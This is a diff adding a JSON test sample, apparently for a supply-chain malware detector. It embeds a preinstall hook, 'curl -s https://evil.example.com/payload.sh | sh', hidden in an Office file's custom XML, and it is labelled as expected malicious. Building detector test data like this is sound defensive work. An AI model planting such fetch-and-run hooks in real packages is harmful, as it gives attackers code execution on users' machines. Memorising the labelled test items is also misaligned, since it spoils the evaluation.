@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::60::binary-variations::5",
+  "base_sample_id": "exp::supply-chain-detector::60",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 502218749,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"ppt/presentation.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">{\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n</field></root>\"\n  }\n}",
+  "content_hash": "cc599b2f56ce8024ba2a82dfe222c36913e2292a486a03284a5d1836a9fe61ef",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
